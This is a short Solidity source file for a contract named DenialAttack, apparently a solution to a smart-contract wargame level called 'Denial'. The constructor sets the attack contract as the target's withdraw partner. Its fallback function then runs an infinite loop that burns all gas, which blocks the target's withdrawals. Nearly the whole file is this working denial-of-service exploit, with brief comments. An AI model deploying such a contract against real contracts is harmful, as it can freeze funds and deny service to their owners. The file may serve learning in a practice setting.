// SPDX-License-Identifier: MIT
pragma solidity 0.6.0; //require solidity version

interface Denial {
    function setWithdrawPartner(address) external;
}

contract DenialAttack {

    constructor(Denial denial) payable public {
        denial.setWithdrawPartner(address(this)); //set this contract as a pratner, so low level call is made to this contract
    }

    fallback() external payable {
        while(true) {

        } // consume all remaning gas when call is made to this contract
    }
}
